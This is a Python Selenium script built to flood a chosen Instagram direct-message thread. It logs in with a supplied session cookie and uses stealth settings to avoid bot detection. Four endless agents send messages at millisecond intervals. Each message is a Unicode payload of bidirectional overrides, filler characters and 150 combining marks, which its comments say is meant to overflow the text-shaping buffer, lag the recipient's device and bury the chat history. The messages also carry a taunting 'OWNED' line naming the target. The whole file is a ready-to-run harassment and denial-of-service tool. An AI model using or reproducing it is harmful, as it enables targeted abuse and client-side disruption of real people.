# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (FINAL-DOMINANCE V91)
# 📅 STATUS: VIEWPORT-LOCK-ACTIVE | 4-AGENT TOTAL | GITHUB-ACTIONS-READY

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# --- ⚡ GLOBAL CONFIG ---
AGENTS_PER_MACHINE = 4             # Optimized for GitHub runner CPU
BURST_SPEED = (0.01, 0.04)         # 🔥 Maximum packet velocity
REFRESH_INTERVAL = 80              # Refresh every 80 strikes to clear DOM memory

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()

def get_dominance_payload(target_name):
    """Generates the recursive-jitter payload with exponential padding."""
    u_id = random.randint(1000, 9999)
    # \u202E = RLO | \u202D = LRO | \u00AD = SHY
    # \u3164 = Hangul Filler | \u034F = CGJ
    rlo, lro, shy, filler, cgj = "\u202E", "\u202D", "\u00AD", "\u3164", "\u034F"
    glue = "\u2060" # Word Joiner
    
    # 1. EXPONENTIAL PADDING (Viewport Dominance)
    # Pushes all other chat history out of the frame.
    padding = (f"{filler}{glue}{cgj}" * 12 + "\n") * 45 
    
    # 2. THE RECURSIVE JITTER CORE
    # Forces a CPU context switch for every single letter.
    jittered_name = ""
    for char in target_name.upper():
        jittered_name += f"{rlo}{shy}{lro}{char}{cgj}"
    
    # 150 marks to overflow the HarfBuzz shaping buffer
    marks = "".join([chr(i) for i in range(0x0300, 0x036F)] * 2)[:150]
    
    header = f"👑 PRAVEER PAPA 👑 [{u_id}]"
    target_msg = f"SYSTEM LOCK: {jittered_name} HAS BEEN OWNED"
    
    return f"{padding}\n{header}\n{marks}\n{target_msg}\n{padding}"[:9998]

def get_driver(agent_id):
    """Initializes a stealthy headless Chrome instance."""
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.binary_location = "/usr/bin/google-chrome"
        
        ua = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/14{random.randint(0,9)}.0.0.0 Safari/537.36"
        chrome_options.add_argument(f"user-agent={ua}")
        
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        return driver

def atomic_dispatch_send(driver, text):
    """Injects payload directly into DOM and forces a high-priority send."""
    try:
        driver.execute_script("""
            var box = document.querySelector('div[role="textbox"], textarea');
            if (box) {
                box.focus();
                document.execCommand('selectAll', false, null);
                document.execCommand('delete', false, null);
                document.execCommand('insertText', false, arguments[0]);
                box.dispatchEvent(new Event('input', { bubbles: true }));
                var e = new KeyboardEvent('keydown', {
                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
                    bubbles: true, cancelable: true
                });
                box.dispatchEvent(e);
            }
        """, text)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target, target_name):
    """Main loop for individual agents."""
    while True:
        driver = None
        try:
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(12) 
            
            strike_count = 0
            while True:
                payload = get_dominance_payload(target_name)
                if atomic_dispatch_send(driver, payload):
                    strike_count += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    print(f"Agent {agent_id}: Dominance-Strike ({GLOBAL_SENT}) | Target: {target_name}")
                    
                    if strike_count % REFRESH_INTERVAL == 0:
                        driver.refresh()
                        time.sleep(5)
                time.sleep(random.uniform(*BURST_SPEED))
        except Exception as e:
            print(f"Agent {agent_id} Error: {e}")
        finally:
            if driver:
                try: driver.quit()
                except: pass
            time.sleep(2)

def main():
    # 🛠️ Configuration pulled from GitHub Secrets/Environment
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target_thread = os.environ.get("TARGET_THREAD_ID", "").strip()
    target_name = os.environ.get("TARGET_NAME", "TARGET")

    if not cookie or not target_thread:
        print("❌ CRITICAL ERROR: Missing Session ID or Thread ID.")
        return

    print(f"🚀 INITIALIZING QUAD-AGENT FLOOD FOR: {target_name}")

    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target_thread, target_name)

if __name__ == "__main__":
    main()
